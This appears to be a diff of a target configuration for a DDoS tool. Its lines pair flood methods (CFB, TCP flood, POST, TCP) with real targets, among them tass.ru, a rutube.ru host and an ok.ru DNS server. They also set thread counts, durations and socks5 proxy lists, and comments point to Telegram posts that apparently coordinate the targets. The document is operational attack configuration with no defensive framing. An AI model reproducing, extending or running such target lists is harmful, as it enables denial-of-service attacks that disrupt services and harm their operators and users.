@@ -6,3 +6,5 @@
 CFB https://xn--80adjigxbghjs.xn--p1ai 0 500 socks5.txt 100 600    #https://всезапомним.рф/
 CFB tass.ru 0 500 socks5.txt 100 600    #tass.ru
 tcp://80.249.129.244:443 tcp://80.249.129.244:80 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug  #postfix-1.avm.rutube.ru https://t.me/c/1624648668/85
+post http://acs.vendorcert.mirconnect.ru 5 4000 socks5.txt 1000 18000 true    #https://t.me/c/1624648668/71
+tcp 217.20.155.93:53 2000 3600 true   #DNS сервер ok.ru  https://t.me/c/1624648668/70
